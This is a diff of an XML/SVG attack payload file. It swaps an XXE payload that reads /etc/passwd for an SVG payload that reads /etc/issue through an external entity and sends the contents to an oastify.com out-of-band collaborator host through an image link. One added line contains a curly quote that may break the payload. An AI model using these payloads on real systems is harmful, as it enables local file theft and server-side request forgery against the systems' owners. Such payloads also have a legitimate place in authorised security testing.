@@ -1,5 +1,5 @@
-<?xml version="1.0"?>
-
-<!DOCTYPE cdl [<!ENTITY asd SYSTEM "file:///etc/passwd">]>
-
-<cdl>&asd;</cdl>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE ENTY [ <!ENTITY XXE SYSTEM “file:///etc/issue"> ]>
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+<image height="30" width="30" xlink:href="http://od5055i1j8ezq99codhufxhf66c40t.oastify.com/SSRF?&XXE;" />
+</svg>
